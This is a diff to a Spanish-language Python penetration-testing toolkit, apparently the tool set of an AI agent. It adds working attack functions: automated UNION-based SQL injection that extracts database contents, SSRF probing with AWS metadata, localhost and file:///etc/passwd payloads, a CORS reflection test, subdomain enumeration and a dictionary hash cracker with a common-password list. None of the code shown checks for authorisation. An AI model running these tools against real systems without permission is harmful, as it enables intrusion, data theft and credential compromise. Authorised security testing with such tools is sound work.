@@ -346,7 +346,8 @@ def probar_idor(url, desde=None, hasta=None):
             'rango': [a, b], 'filas': filas,
             'nota': 'Los que dan 200 con contenido distinto son de otro usuario: eso es IDOR.'}
 
-NOMBRES = ('huella_web', 'peticion_http', 'enumerar_rutas', 'analizar_js', 'decodificar_jwt', 'probar_idor', 'escanear_puertos', 'ver_certificado', 'dns_registros', 'probar_sqli', 'abrir_sesion', 'verificar_sesion', 'extraer_sqli', 'subir_archivo', 'probar_xss', 'reporte')
+NOMBRES = ('huella_web', 'peticion_http', 'enumerar_rutas', 'analizar_js', 'decodificar_jwt', 'probar_idor', 'escanear_puertos', 'ver_certificado', 'dns_registros', 'probar_sqli', 'abrir_sesion', 'verificar_sesion', 'extraer_sqli', 'subir_archivo', 'probar_xss', 'enumerar_subdominios', 'extraer_union',
+           'probar_cors', 'probar_ssrf', 'romper_hash', 'reporte')
 
 def herramienta(nombre, args):
     a = args if isinstance(args, dict) else {}
@@ -386,6 +387,18 @@ def herramienta(nombre, args):
             return subir_archivo(a.get('url'), a.get('campo'), a.get('nombre'), a.get('contenido'), a.get('tipo'), a.get('campos_extra'))
         if nombre == 'probar_xss':
             return probar_xss(a.get('url'), a.get('parametro'), a.get('metodo'), a.get('cuerpo'))
+        if nombre == 'enumerar_subdominios':
+            return enumerar_subdominios(a.get('dominio') or a.get('url'), a.get('palabra'), a.get('limite') or 150)
+        if nombre == 'extraer_union':
+            return extraer_union(a.get('url'), a.get('parametro'), a.get('dbms') or 'MySQL',
+                                 a.get('que') or 'db', a.get('tabla') or '', a.get('columna') or '',
+                                 a.get('desde') or 1, a.get('largo') or 12, a.get('comilla') or "'")
+        if nombre == 'probar_cors':
+            return probar_cors(a.get('url'), a.get('origen'))
+        if nombre == 'probar_ssrf':
+            return probar_ssrf(a.get('url'), a.get('parametro'), a.get('metodo'), a.get('cuerpo'))
+        if nombre == 'romper_hash':
+            return romper_hash(a.get('hash'), a.get('lista'))
         if nombre == 'reporte':
             return reporte(a.get('objetivo'))
     except Exception as e:
@@ -440,6 +453,22 @@ HERRAMIENTAS = [
        ('url', 'parametro', 'dbms')),
     _e('subir_archivo', 'Sube un archivo de prueba (multipart).', {'url': {'type': 'string'}, 'campo': {'type': 'string'}, 'nombre': {'type': 'string'}, 'contenido': {'type': 'string'}, 'tipo': {'type': 'string'}, 'campos_extra': {'type': 'string'}}, ('url', 'campo')),
     _e('probar_xss', 'Prueba XSS reflejado en un parametro.', {'url': {'type': 'string'}, 'parametro': {'type': 'string'}, 'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}}, ('url', 'parametro')),
+    _e('enumerar_subdominios', 'Busca subdominios por transparencia de certificados y diccionario, y '
+       'dice cuales resuelven. Usalo despues de la huella.', {'dominio': {'type': 'string'},
+       'palabra': {'type': 'string'}, 'limite': {'type': 'integer'}}, ('dominio',)),
+    _e('extraer_union', 'Extrae datos por UNION SELECT cuando la inyeccion ya esta confirmada y hay columnas '
+       'reflejadas. Mucho mas rapido que extraer_sqli.',
+       {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
+        'dbms': {'type': 'string'}, 'que': {'type': 'string'}, 'tabla': {'type': 'string'},
+        'columna': {'type': 'string'}, 'desde': {'type': 'integer'}, 'largo': {'type': 'integer'},
+        'comilla': {'type': 'string'}}, ('url', 'parametro', 'dbms')),
+    _e('probar_cors', 'Prueba si el sitio refleja origenes ajenos (CORS abierto).',
+       {'url': {'type': 'string'}, 'origen': {'type': 'string'}}, ('url',)),
+    _e('probar_ssrf', 'Prueba SSRF: mete destinos internos (metadata AWS, localhost, file://) en un parametro.',
+       {'url': {'type': 'string'}, 'parametro': {'type': 'string'},
+        'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}}, ('url', 'parametro')),
+    _e('romper_hash', 'Identifica y rompe un hash debil (md5, sha1, sha256) por diccionario.',
+       {'hash': {'type': 'string'}, 'lista': {'type': 'string'}}, ('hash',)),
     _e('reporte', 'Arma el reporte markdown con lo hallado.', {'objetivo': {'type': 'string'}}, ()),
 
 ]
@@ -783,3 +812,260 @@ def dns_registros(dominio):
             out[tipo] = v[:12]
     return {'ok': True, 'dominio': d, 'registros': out,
             'nota': 'TXT y MX delatan servicios de correo y verificaciones.'}
+
+SUBDOMINIOS = ('www api app dev test staging stage prod admin panel portal blog shop tienda mail '
+               'webmail smtp ftp cdn static assets img media files docs wiki git gitlab jenkins ci '
+               'dashboard auth login sso vpn remote intranet interno db mysql postgres redis mongo '
+               'grafana kibana prometheus status monitor backup backups old demo beta alpha sandbox '
+               'preview uat qa soporte help sistemas app2 web2 mail2 ns1 ns2 cpanel autodiscover').split()
+
+def enumerar_subdominios(dominio, palabra=None, limite=150):
+    d = (_host(_norm(dominio)) or (dominio or '').strip().lower()).strip('.')
+    if not d or '.' not in d:
+        return {'ok': False, 'error': 'dominio invalido'}
+    extra = [x.strip().lower() for x in re.split(r'[,\n]+', str(palabra)) if x.strip()][:80] if palabra else []
+    candidatos, vistos = [], set()
+    try:
+        r = requests.get('https://crt.sh/', params={'q': '%.' + d, 'output': 'json'},
+                         headers={'User-Agent': UA, 'Accept': 'application/json'},
+                         timeout=TIMEOUT + 10, verify=False)
+        for f in (r.json() or [])[:600]:
+            for n in str(f.get('name_value') or '').split('\n'):
+                n = n.strip().lower().lstrip('*.')
+                if n.endswith('.' + d) and n not in vistos:
+                    vistos.add(n)
+                    candidatos.append(n)
+    except Exception:
+        pass
+    de_crt = len(candidatos)
+    for s in extra + SUBDOMINIOS:
+        n = s + '.' + d
+        if n not in vistos:
+            vistos.add(n)
+            candidatos.append(n)
+    candidatos = candidatos[:min(int(limite or 150), 300)]
+
+    def uno(n):
+        ips = _doh(n, 'A')
+        return {'subdominio': n, 'ips': ips[:4]} if ips else None
+
+    t0 = time.time()
+    with ThreadPoolExecutor(max_workers=MAX_HILOS) as ex:
+        vivos = sorted((x for x in ex.map(uno, candidatos) if x), key=lambda v: v['subdominio'])
+    for v in vivos:
+        _anotar('Subdominio expuesto', 'info', 'https://' + v['subdominio'], ', '.join(v['ips']))
+    return {'ok': True, 'dominio': d, 'probados': len(candidatos), 'de_crt': de_crt,
+            'vivos': vivos[:80], 'segundos': round(time.time() - t0, 1),
+            'nota': 'Un subdominio vivo es superficie nueva: pasalo aparte por huella_web.'}
+
+def _marca(dbms, expr):
+    if dbms == 'MySQL':
+        return "CONCAT('x'," + expr + ",'x')"
+    if dbms == 'MSSQL':
+        return "'x' + " + expr + " + 'x'"
+    return "'x' || " + expr + " || 'x'"
+
+def extraer_union(url, parametro, dbms='MySQL', que='db', tabla='', columna='',
+                  desde=1, largo=12, comilla="'", metodo='GET', cuerpo=None):
+    u = _norm(url)
+    if not u or not parametro:
+        return {'ok': False, 'error': 'hacen falta url y parametro'}
+    dbms = next((d for d in CONSULTAS['tablas'] if d.lower() == str(dbms).lower()), '')
+    if not dbms:
+        return {'ok': False, 'error': 'dbms debe ser uno de: ' + ', '.join(CONSULTAS['tablas'])}
+    plantilla = CONSULTAS.get(que, {}).get(dbms)
+    if not plantilla:
+        return {'ok': False, 'error': 'que debe ser db, tablas, columnas o datos'}
+    if que in ('columnas', 'datos') and not tabla:
+        return {'ok': False, 'error': 'falta la tabla'}
+    if que == 'datos' and not columna:
+        return {'ok': False, 'error': 'falta la columna'}
+    consulta = plantilla.replace('{t}', tabla).replace('{c}', columna)
+    q = comilla or "'"
+    m = 'POST' if str(metodo).upper() == 'POST' else 'GET'
+
+    def pedir(valor):
+        if m == 'POST':
+            return _pedir(u, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'},
+                          _pon_cuerpo(cuerpo, parametro, valor))
+        return _pedir(_pon(u, parametro, quote(valor, safe='')))
+
+    base, err = pedir('1')
+    if err:
+        return err
+    texto_base = base.text or ''
+
+    def hay_error(r):
+        if r is None or r.status_code >= 500:
+            return True
+        bajo = (r.text or '')[:6000].lower()
+        return any(p in bajo for pats in ERRORES_SQL.values() for p in pats)
+
+    columnas = 0
+    for n in range(1, 16):
+        r, e = pedir('1' + q + ' ORDER BY ' + str(n) + '-- -')
+        if e:
+            return e
+        if hay_error(r):
+            columnas = n - 1
+            break
+    if columnas < 1:
+        return {'ok': False, 'error': 'no logre contar columnas; prueba comilla=" o extraer_sqli a ciegas'}
+
+    def union(pos, expr):
+        cols = ['NULL' if i != pos else expr for i in range(1, columnas + 1)]
+        carga = '1' + q + ' UNION SELECT ' + ','.join(cols)
+        if dbms == 'Oracle':
+            carga += ' FROM dual'
+        return pedir(carga + '-- -')
+
+    reflejadas = []
+    for pos in range(1, columnas + 1):
+        r, e = union(pos, '1111')
+        if e or r is None:
+            continue
+        if '1111' in (r.text or '') and '1111' not in texto_base:
+            reflejadas.append(pos)
+    if not reflejadas:
+        return {'ok': True, 'columnas': columnas, 'reflejadas': [], 'texto': '',
+                'nota': 'Hay columnas pero ninguna se refleja: usa extraer_sqli (ciega).'}
+
+    pos = reflejadas[0]
+    largo = max(1, min(int(largo or 12), 40))
+    desde = max(1, int(desde or 1))
+    sub = 'SUBSTR' if dbms == 'Oracle' else 'SUBSTRING'
+    asc = 'UNICODE' if dbms == 'SQLite' else 'ASCII'
+
+    def pedir_char(i, mid):
+        r, e = union(pos, _marca(dbms, f'{asc}({sub}(({consulta}),{i},1))'))
+        if e or r is None:
+            return None, e
+        return ('x' + str(mid) + 'x') in (r.text or ''), None
+
+    t0 = time.time()
+    texto, corte = _bin(pedir_char, consulta, desde, largo)
+    if texto:
+        _anotar('Inyeccion SQL UNION', 'critica', u, 'extraccion directa por UNION en ' + parametro, texto[:200])
+    return {'ok': True, 'columnas': columnas, 'reflejadas': reflejadas, 'consulta': consulta,
+            'texto': texto, 'corte': corte, 'segundos': round(time.time() - t0, 1),
+            'nota': 'Sigue con desde=%d. UNION va mucho mas rapido que la ciega.' % (desde + len(texto))}
+
+def probar_cors(url, origen=None):
+    u = _norm(url)
+    if not u:
+        return {'ok': False, 'error': 'URL invalida'}
+    p = urlparse(u)
+    base = f'{p.scheme}://{p.netloc}'
+    pruebas = [str(origen).strip()] if origen else ['https://evil-jarvis.example', 'null', base]
+    filas = []
+    for o in pruebas[:3]:
+        r, e = _pedir(u, 'GET', {'Origin': o})
+        if e or r is None:
+            continue
+        filas.append({'origen_enviado': o,
+                      'allow_origin': r.headers.get('Access-Control-Allow-Origin', ''),
+                      'allow_credentials': r.headers.get('Access-Control-Allow-Credentials', '')})
+    if not filas:
+        return {'ok': False, 'error': 'no pude hacer las peticiones'}
+    fuga = [f for f in filas if f['allow_origin'] == f['origen_enviado'] and f['allow_origin']]
+    cred = any(f['allow_credentials'].lower() == 'true' for f in filas)
+    if fuga and cred:
+        sev, det = 'alta', 'refleja el Origin enviado y acepta credenciales: un sitio ajeno lee respuestas autenticadas'
+    elif fuga:
+        sev, det = 'media', 'refleja cualquier Origin: un sitio ajeno puede leer la respuesta'
+    elif any(f['allow_origin'] == '*' for f in filas):
+        sev, det = 'baja', 'usa * (abierto a todos, sin credenciales)'
+    else:
+        sev, det = 'info', 'no refleja origenes ajenos'
+    if sev in ('alta', 'media'):
+        _anotar('CORS mal configurado', sev, u, det, fuga[0]['allow_origin'])
+    return {'ok': True, 'url': u, 'pruebas': filas, 'hallazgo': det, 'severidad': sev,
+            'nota': 'Reflejar Origin + credenciales es lo grave: se lee con la sesion de la victima.'}
+
+SSRF_CARGAS = (('metadata AWS', 'http://169.254.169.254/latest/meta-data/'),
+               ('localhost', 'http://127.0.0.1/'),
+               ('loopback 8080', 'http://127.0.0.1:8080/'),
+               ('archivo local', 'file:///etc/passwd'))
+MARCAS_SSRF = ('ami-id', 'instance-id', 'root:x:0:0', 'it works!', 'apache2', 'nginx', 'localhost')
+
+def probar_ssrf(url, parametro, metodo='GET', cuerpo=None):
+    u = _norm(url)
+    if not u or not parametro:
+        return {'ok': False, 'error': 'hacen falta url y parametro'}
+    m = 'POST' if str(metodo).upper() == 'POST' else 'GET'
+
+    def pedir(valor):
+        if m == 'POST':
+            return _pedir(u, 'POST', {'Content-Type': 'application/x-www-form-urlencoded'},
+                          _pon_cuerpo(cuerpo, parametro, quote(valor, safe='')))
+        return _pedir(_pon(u, parametro, quote(valor, safe='')))
+
+    base, err = pedir('http://jarvis-ssrf-inexistente.invalid')
+    if err:
+        return err
+    lar_base = len(base.content or b'')
+    hits = []
+    for nombre, carga in SSRF_CARGAS:
+        r, e = pedir(carga)
+        if e or r is None:
+            continue
+        bajo = (r.text or '').lower()
+        marcas = [x for x in MARCAS_SSRF if x in bajo]
+        if marcas or (r.status_code == 200 and abs(len(r.content or b'') - lar_base) > 80):
+            hits.append({'prueba': nombre, 'carga': carga, 'status': r.status_code,
+                         'marcas': marcas, 'muestra': _recorte(r.text, 400)})
+    if hits:
+        _anotar('SSRF', 'alta', u, 'el parametro ' + parametro + ' acepta destinos internos', hits[0]['muestra'][:200])
+    return {'ok': True, 'url': u, 'parametro': parametro, 'hits': hits,
+            'vulnerable': bool(hits),
+            'nota': 'Si responde al metadata de AWS o a localhost, el servidor hace la peticion por ti.'}
+
+CLAVES_COMUNES = ('123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon '
+                  '123123 baseball abc123 football monkey letmein shadow master 666666 qwertyuiop '
+                  '123321 mustang michael 654321 pussy superman 1qaz2wsx 7777777 fuckyou 121212 '
+                  '000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh hunter '
+                  'buster soccer harley batman andrew tigger sunshine iloveyou 2000 charlie '
+                  'robert thomas hockey ranger daniel starwars klaster 112233 george computer '
+                  'michelle jessica pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777 '
+                  'pass fuckmylife maggie 159753 aaaaaa ginger princess joshua cheese amanda '
+                  'summer love ashley 6969 nicole chelsea biteme matthew access yankees 987654321 '
+                  'dallas austin thunder taylor matrix william corvette hello martin heather '
+                  'secret hammer 123abc 1q2w3e4r 1234qwer admin administrador root toor test '
+                  'prueba hola colombia bogota jarvis david').split()
+
+def _algoritmo_hash(h):
+    return {32: 'md5', 40: 'sha1', 56: 'sha224', 64: 'sha256', 96: 'sha384', 128: 'sha512'}.get(len(h), '')
+
+def _digiere(palabra, algo):
+    return hashlib.new(algo, palabra.encode('utf-8', errors='ignore')).hexdigest()
+
+def romper_hash(hash_, lista=None, con_variantes=True):
+    h = (hash_ or '').strip().lower()
+    if h.startswith('0x'):
+        h = h[2:]
+    algo = _algoritmo_hash(h)
+    if not algo or not re.fullmatch(r'[0-9a-f]+', h):
+        return {'ok': False, 'error': 'no reconozco ese formato (md5 32, sha1 40, sha256 64, sha512 128 hex)'}
+    candidatas = [x.strip() for x in re.split(r'[,\n\s]+', str(lista)) if x.strip()] if lista else []
+    candidatas += list(CLAVES_COMUNES)
+    if con_variantes:
+        base = list(candidatas)
+        for p in base[:60]:
+            candidatas += [p.capitalize(), p.upper(), p + '1', p + '123']
+        for p in base[:40]:
+            candidatas += [p + str(a) for a in range(0, 10)]
+    vistos, total = set(), 0
+    t0 = time.time()
+    for p in candidatas:
+        if p in vistos:
+            continue
+        vistos.add(p)
+        total += 1
+        if _digiere(p, algo) == h:
+            _anotar('Hash debil roto', 'alta', 'hash ' + algo, 'clave: ' + p, h[:60])
+            return {'ok': True, 'algoritmo': algo, 'clave': p, 'probadas': total,
+                    'segundos': round(time.time() - t0, 2),
+                    'nota': 'Clave debil: hay que cambiarla y usar un algoritmo lento (bcrypt o argon2).'}
+    return {'ok': True, 'algoritmo': algo, 'clave': '', 'probadas': total,
+            'segundos': round(time.time() - t0, 2),
+            'nota': 'No estaba en la lista. Pasa palabras propias en lista= o usa hashcat fuera.'}
